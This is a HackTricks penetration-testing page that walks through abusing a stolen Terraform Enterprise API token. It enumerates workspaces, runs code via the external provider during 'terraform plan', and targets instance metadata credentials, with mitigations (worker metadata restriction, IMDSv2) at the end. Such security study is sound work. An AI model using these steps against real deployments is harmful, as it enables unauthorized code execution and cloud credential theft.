# Terraform Enterprise Security

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

****[**Terraform Enterprise**](https://www.terraform.io/enterprise) **is a self-hosted version of Terraform Cloud**, allowing organizations to maintain their own private instance of Terraform. If it's **deployed** to a **VM** from a **cloud** provider we may be able to access the **instance metadata** service and leverage those credentials for further attacks.

"By default, Terraform Enterprise **does not prevent Terraform operations from accessing the instance metadata service**, which may contain IAM credentials or other sensitive data" ([source](https://www.terraform.io/enterprise/system-overview/security-model#restrict-terraform-build-worker-metadata-access))

{% hint style="info" %}
While the focus of this article is on targeting the metadata service, it is worth noting that gaining code execution inside a Terraform run may provide other avenues for attack. For example, environment variables could be leaked which may contain sensitive credentials.
{% endhint %}

## Remote (Code) Execution <a href="#remote-code-execution" id="remote-code-execution"></a>

For many engineers, their first experience with Terraform was locally on their workstations. When they invoked a `terraform apply` or `terraform plan` all of that activity took place on the local machine (reaching out to cloud APIs, tracking state, etc.)

An exciting feature of Terraform Enterprise (and Cloud) is the idea of [**Remote Execution**](https://www.terraform.io/cloud-docs/overview#remote-terraform-execution), wherein all those **operations take place server-side**. In **Terraform Cloud the execution takes place in "disposable virtual machines"**. In [**Terraform Enterprise**](https://www.terraform.io/enterprise/install/interactive/installer#alternative-terraform-worker-image) **however, it takes place in "disposable Docker containers".**

This introduces an interesting opportunity; If you compromise credentials to initiate a `plan` or `apply` operation (or otherwise have access to them. I.E insider threat) we can **execute code in a Docker container on the Terraform Enterprise server**.

{% hint style="info" %}
It is possible to disable Remote Execution via a configuration however this is [discouraged](https://www.terraform.io/cloud-docs/run#disabling-remote-operations). "Many of Terraform Cloud's features rely on remote execution, and are not available when using local operations. This includes features like Sentinel policy enforcement, cost estimation, and notifications."
{% endhint %}

### Walkthrough <a href="#walkthrough" id="walkthrough"></a>

#### Acquire a Terraform API Token <a href="#acquire-a-terraform-api-token" id="acquire-a-terraform-api-token"></a>

To begin, you'll first need to 'acquire' a [Terraform API Token](https://www.terraform.io/cloud-docs/users-teams-organizations/api-tokens). These **tokens** can be identified by the **`.atlasv1.` substring** in them.

As for where you would get one, there are a number of possible locations. For example, developer's may have them locally on their **workstations** in `~/.terraform.d/`, you may find them in CI/CD **pipelines**, inappropriately stored in **documentation**, pull them from a secrets vault, create one with a developer's stolen credentials, etc.

#### Identify the Organization and Workspace Names <a href="#identify-the-organization-and-workspace-names" id="identify-the-organization-and-workspace-names"></a>

With access to a valid API token, we now need to **find an Organization and Workspace** we can use to be nefarious. The good news is that this information is queryable using the token. We can use a tool such as [jq](https://stedolan.github.io/jq/) to parse and display the JSON.

```bash
curl -H "Authorization: Bearer $TFE_TOKEN" https://<TFE Instance>/api/v2/organizations | jq
```

![](<../../.gitbook/assets/image (77).png>)

Next, we need to identify a [workspace](https://www.terraform.io/cloud-docs/api-docs/workspaces) we can use. Again, this can be quereyed using the organization `id` we gathered in the previous step.

```bash
curl -H "Authorization: Bearer $TFE_TOKEN" https://<TFE Instance>/api/v2/organizations/<Organization ID>/workspaces | jq
```

![](<../../.gitbook/assets/image (11).png>)

#### Configure the Remote Backend <a href="#configure-the-remote-backend" id="configure-the-remote-backend"></a>

Now that we have the organization and workspace id's from the previous step, we can **configure the remote backend**. To do this, you can use [this example](https://github.com/hashicorp/tfc-getting-started/blob/main/backend.tf) as a template with one exception. We will **add a `hostname`** value which is the hostname of the Terraform Enterprise instance. You can store this in a file named `backend_config.tf`.

{% code title="backend_config.tf" %}
```json
terraform {
  backend "remote" {
    hostname = "{{TFE_HOSTNAME}}"
    organization = "{{ORGANIZATION_NAME}}"

    workspaces {
      name = "{{WORKSPACE_NAME}}"
    }
  }
}
```
{% endcode %}

#### Initialize the Backend <a href="#initialize-the-backend" id="initialize-the-backend"></a>

With the backend configuration file created we can initialize the backend with the following command.

```bash
terraform init --backend-config="token=$TFE_TOKEN"
```

If everything has worked as it should, you should get a `Terraform has been successfully initialized` notification. To test this, you can perform a `terraform state list` to list the various state objects.

#### Executing Code <a href="#executing-code" id="executing-code"></a>

There are several ways this can be done (such as using a [local-exec provisioner](https://www.terraform.io/language/resources/provisioners/local-exec)) however, for our purposes we will be using the [External Provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs).

"_`external` is a special provider that exists to provide an interface between Terraform and external programs_".

What this means is that we can **execute code during the Terraform `plan`** or `apply` operations by specifying a program or script to run.

To do this, we will create an `external provider` in our existing `backend_config.tf` file (if you already have an existing Terraform project you can add this block to those existing files).

{% code title="backend_config.tf" %}
```bash
...

data "external" "external_provider" {
    program = ["python3", "wrapper.py"]
}

output "external_provider_example" {
    value = data.external.external_provider
}
```
{% endcode %}

You may be wondering what the `wrapper.py` file is. In order to use the `external` provider, we must "implement a specific protocol" ([source](https://registry.terraform.io/providers/hashicorp/external/latest/docs)), which is JSON. To do this, we will wrap the result of the code execution in JSON so it can be returned.

{% hint style="info" %}
The wrapper script is not strictly required if you aren't interested in getting the output. If your goal is simply to execute a C2 payload, you can include the binary in the project directory and then execute it.

Check for [**more payloads here**](./#using-an-external-provider).
{% endhint %}

Wrapping the output in JSON allows us to get the **response output**.

Our wrapper script looks like the following (feel free to change to your needs).

{% code title="wrapper.py" %}
```python
import json
import os

stream = os.popen('id')
output = stream.read()
result = { "result" : output }

print(json.dumps(result))
```
{% endcode %}

#### Terraform Plan <a href="#terraform-plan" id="terraform-plan"></a>

Now that the wrapper script is created (and modified), we can execute code via **`terraform plan`**. This is a **non-destructive action**, which will evaluate our local configuration vs's the remote state. In addition, it will **execute our remote provider and return the result to us**.

![](<../../.gitbook/assets/image (58).png>)

{% hint style="warning" %}
Upon executing `terraform plan` you may encounter errors for various reasons depending upon the remote state. Those errors will need to be handled on a case by case basis. Typically this involves modifying your `.tf` files to suit the remote state. This can typically be figured out based on the results of `terraform state pull`.

From here, we can modify our wrapper script to do a variety of things such as (the purpose of this article) reaching out to the metadata service and pulling those credentials.
{% endhint %}

{% hint style="info" %}
The results of this run are logged elsewhere. Please do not leak secrets or other sensitive information to parties who do not have a need for the information. A more efficient method would be to use a C2 platform such as [Mythic](https://docs.mythic-c2.net/) (or even just a TLS encrypted reverse shell) to exfiltrate the credentials.
{% endhint %}

## Attack Prevention <a href="#attack-prevention" id="attack-prevention"></a>

It is worth noting that there are two potential methods to mitigate this attack. The first is the configuration of [restrict\_worker\_metadata\_access](https://www.terraform.io/enterprise/system-overview/security-model#restrict-terraform-build-worker-metadata-access) in the Terraform Enterprise settings. This is **not** the default, meaning that out of the box Terraform operations have access to the metadata service and its credentials.

The second option would depend upon the cloud provider, but options to harden or secure the Metadata Service can also be used. For example, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) in an AWS situation would prevent the [Docker container from reaching the Metadata Service](https://hackingthe.cloud/aws/general-knowledge/intro\_metadata\_service/).

Note

Nothing should prevent these two methods from working at the same time. It is a good idea to require IMDSv2 of all EC2 instances in your environment.

## References

* [https://hackingthe.cloud/terraform/terraform\_enterprise\_metadata\_service/](https://hackingthe.cloud/terraform/terraform\_enterprise\_metadata\_service/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
